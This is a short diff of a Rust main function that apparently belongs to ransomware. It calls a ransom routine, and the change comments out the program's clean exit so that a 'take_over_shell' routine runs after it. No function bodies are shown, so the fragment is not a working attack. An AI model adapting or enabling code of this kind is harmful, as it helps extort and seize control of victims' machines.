@@ -46,9 +46,9 @@ fn main() {
 
     initiate_ransom_process();
 
-    debug!("Exiting Gracefully.");
+    debug!("Taking over shell");
 
-    std::process::exit(0);
+    // std::process::exit(0);
 
     take_over_shell();
 }
